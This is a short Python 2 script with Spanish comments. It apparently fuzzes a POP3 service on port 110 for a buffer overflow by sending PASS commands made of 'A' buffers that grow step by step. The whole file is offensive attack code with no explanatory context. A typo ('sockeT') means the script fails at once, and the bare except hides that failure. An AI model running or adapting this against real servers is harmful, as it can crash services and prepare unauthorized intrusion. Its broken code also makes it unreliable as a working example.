#!/usr/bin/python
#coding: utf-8

from pwn import *
import socket, sys
if len(sys.argv) <2:
	print "\nUso: python " + sys.argv[0] + " <ip-address>\n"
	sys.exit(0)

# Variables Globales
ip_address = sys.argv[1]
rport= 110

if __name__ == '__main__':
	buffer = ["A"]
	contador = 100

	while len(buffer) < 32:
		buffer.append("A"*contador)
		contador += 100

	for strings in buffer:

		try:
			s= socket.socket(socket.AF_INET, sockeT.SOCK_STREAM)
			s.connect((ip_address, rport))

			data = s.recv(1024)

			s.send("User Koba\r\n")
			data = s.recv(1024)
			s.send("PASS %s\r\n" % strings)
			data = s.recv(1024)

		except:
			print "\nHa habido un error de conexión\n"
			sys.exit(1)